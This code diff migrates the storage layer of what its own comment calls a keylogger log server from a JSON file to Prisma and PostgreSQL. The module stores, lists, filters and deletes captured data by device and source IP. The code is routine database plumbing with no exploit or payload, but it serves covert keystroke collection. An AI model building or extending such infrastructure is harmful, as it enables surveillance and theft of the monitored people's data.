@@ -1,17 +1,11 @@
-import { existsSync } from "node:fs";
-import { mkdir, readFile, writeFile } from "node:fs/promises";
-import path from "node:path";
+import prisma from "@/lib/prisma";
 
 // ============================================================
-// Simple JSON file-based database for keylogger logs
+// Database layer powered by Prisma + Neon PostgreSQL
 //
-// On Vercel (production), the filesystem is read-only except
-// for /tmp. We detect the environment and use /tmp/data/ for
-// storage in production, and the local data/ directory in dev.
-//
-// NOTE: /tmp on Vercel is ephemeral — data is lost between
-// cold starts. For persistent storage, use a real database
-// (e.g., Vercel KV, PostgreSQL, MongoDB).
+// All public functions keep the same interface as the previous
+// JSON file-based implementation so that API routes don't need
+// any changes.
 // ============================================================
 
 export interface LogEntry {
@@ -22,63 +16,28 @@ export interface LogEntry {
   timestamp: string;
 }
 
-interface Database {
-  logs: LogEntry[];
-}
-
-// Use /tmp on Vercel (production), local data/ directory in development
-const IS_VERCEL = process.env.VERCEL === "1";
-const DATA_DIR = IS_VERCEL
-  ? path.join("/tmp", "data")
-  : path.join(process.cwd(), "data");
-const DB_PATH = path.join(DATA_DIR, "logs.json");
+// ============================================================
+// Helpers
+// ============================================================
 
 /**
- * Ensure the data directory and database file exist.
+ * Convert a Prisma Log row into the plain LogEntry object that
+ * the rest of the app expects (timestamp as ISO string).
  */
-async function ensureDb(): Promise<void> {
-  if (!existsSync(DATA_DIR)) {
-    await mkdir(DATA_DIR, { recursive: true });
-  }
-
-  if (!existsSync(DB_PATH)) {
-    const emptyDb: Database = { logs: [] };
-    await writeFile(DB_PATH, JSON.stringify(emptyDb, null, 2), "utf-8");
-  }
-}
-
-/**
- * Read the entire database from disk.
- */
-async function readDb(): Promise<Database> {
-  await ensureDb();
-
-  try {
-    const raw = await readFile(DB_PATH, "utf-8");
-    return JSON.parse(raw) as Database;
-  } catch {
-    // If the file is corrupted, reset it
-    const emptyDb: Database = { logs: [] };
-    await writeFile(DB_PATH, JSON.stringify(emptyDb, null, 2), "utf-8");
-    return emptyDb;
-  }
-}
-
-/**
- * Write the entire database to disk.
- */
-async function writeDb(db: Database): Promise<void> {
-  await ensureDb();
-  await writeFile(DB_PATH, JSON.stringify(db, null, 2), "utf-8");
-}
-
-/**
- * Generate a unique ID for a log entry.
- */
-function generateId(): string {
-  const timestamp = Date.now().toString(36);
-  const random = Math.random().toString(36).substring(2, 10);
-  return `${timestamp}-${random}`;
+function toLogEntry(row: {
+  id: string;
+  device: string;
+  data: string;
+  ip: string;
+  timestamp: Date;
+}): LogEntry {
+  return {
+    id: row.id,
+    device: row.device,
+    data: row.data,
+    ip: row.ip,
+    timestamp: row.timestamp.toISOString(),
+  };
 }
 
 // ============================================================
@@ -93,20 +52,15 @@ export async function addLog(
   data: string,
   ip: string,
 ): Promise<LogEntry> {
-  const db = await readDb();
+  const row = await prisma.log.create({
+    data: {
+      device,
+      data,
+      ip,
+    },
+  });
 
-  const entry: LogEntry = {
-    id: generateId(),
-    device,
-    data,
-    ip,
-    timestamp: new Date().toISOString(),
-  };
-
-  db.logs.push(entry);
-  await writeDb(db);
-
-  return entry;
+  return toLogEntry(row);
 }
 
 /**
@@ -114,22 +68,14 @@ export async function addLog(
  * Results are sorted by timestamp (newest first).
  */
 export async function getLogs(device?: string): Promise<LogEntry[]> {
-  const db = await readDb();
+  const rows = await prisma.log.findMany({
+    where: device
+      ? { device: { equals: device, mode: "insensitive" } }
+      : undefined,
+    orderBy: { timestamp: "desc" },
+  });
 
-  let logs = db.logs;
-
-  if (device) {
-    logs = logs.filter(
-      log => log.device.toLowerCase() === device.toLowerCase(),
-    );
-  }
-
-  // Sort by timestamp, newest first
-  logs.sort(
-    (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime(),
-  );
-
-  return logs;
+  return rows.map(toLogEntry);
 }
 
 /**
@@ -140,69 +86,67 @@ export async function getLogsByDateRange(
   endDate: string,
   device?: string,
 ): Promise<LogEntry[]> {
-  const logs = await getLogs(device);
-
-  const start = new Date(startDate).getTime();
-  const end = new Date(endDate).getTime();
-
-  return logs.filter(log => {
-    const logTime = new Date(log.timestamp).getTime();
-    return logTime >= start && logTime <= end;
+  const rows = await prisma.log.findMany({
+    where: {
+      timestamp: {
+        gte: new Date(startDate),
+        lte: new Date(endDate),
+      },
+      ...(device
+        ? { device: { equals: device, mode: "insensitive" as const } }
+        : {}),
+    },
+    orderBy: { timestamp: "desc" },
   });
+
+  return rows.map(toLogEntry);
 }
 
 /**
  * Get a single log entry by ID.
  */
 export async function getLogById(id: string): Promise<LogEntry | undefined> {
-  const db = await readDb();
-  return db.logs.find(log => log.id === id);
+  const row = await prisma.log.findUnique({ where: { id } });
+  return row ? toLogEntry(row) : undefined;
 }
 
 /**
  * Delete a single log entry by ID.
  */
 export async function deleteLog(id: string): Promise<boolean> {
-  const db = await readDb();
-
-  const index = db.logs.findIndex(log => log.id === id);
-  if (index === -1) return false;
-
-  db.logs.splice(index, 1);
-  await writeDb(db);
-
-  return true;
+  try {
+    await prisma.log.delete({ where: { id } });
+    return true;
+  } catch {
+    // Record not found
+    return false;
+  }
 }
 
 /**
  * Delete all log entries, optionally filtered by device.
  */
 export async function clearLogs(device?: string): Promise<number> {
-  const db = await readDb();
+  const result = await prisma.log.deleteMany({
+    where: device
+      ? { device: { equals: device, mode: "insensitive" } }
+      : undefined,
+  });
 
-  if (device) {
-    const before = db.logs.length;
-    db.logs = db.logs.filter(
-      log => log.device.toLowerCase() !== device.toLowerCase(),
-    );
-    const deleted = before - db.logs.length;
-    await writeDb(db);
-    return deleted;
-  }
-
-  const deleted = db.logs.length;
-  db.logs = [];
-  await writeDb(db);
-  return deleted;
+  return result.count;
 }
 
 /**
  * Get a list of all unique device names that have sent logs.
  */
 export async function getDevices(): Promise<string[]> {
-  const db = await readDb();
-  const devices = new Set(db.logs.map(log => log.device));
-  return Array.from(devices).sort();
+  const rows = await prisma.log.findMany({
+    distinct: ["device"],
+    select: { device: true },
+    orderBy: { device: "asc" },
+  });
+
+  return rows.map((row: { device: string }) => row.device);
 }
 
 /**
@@ -215,18 +159,24 @@ export async function getStats(): Promise<{
   oldestLog: string | null;
   newestLog: string | null;
 }> {
-  const db = await readDb();
-  const devices = Array.from(new Set(db.logs.map(log => log.device))).sort();
-
-  const sorted = [...db.logs].sort(
-    (a, b) => new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime(),
-  );
+  const [totalLogs, devices, oldest, newest] = await Promise.all([
+    prisma.log.count(),
+    getDevices(),
+    prisma.log.findFirst({
+      orderBy: { timestamp: "asc" },
+      select: { timestamp: true },
+    }),
+    prisma.log.findFirst({
+      orderBy: { timestamp: "desc" },
+      select: { timestamp: true },
+    }),
+  ]);
 
   return {
-    totalLogs: db.logs.length,
+    totalLogs,
     totalDevices: devices.length,
     devices,
-    oldestLog: sorted.length > 0 ? sorted[0].timestamp : null,
-    newestLog: sorted.length > 0 ? sorted[sorted.length - 1].timestamp : null,
+    oldestLog: oldest ? oldest.timestamp.toISOString() : null,
+    newestLog: newest ? newest.timestamp.toISOString() : null,
   };
 }
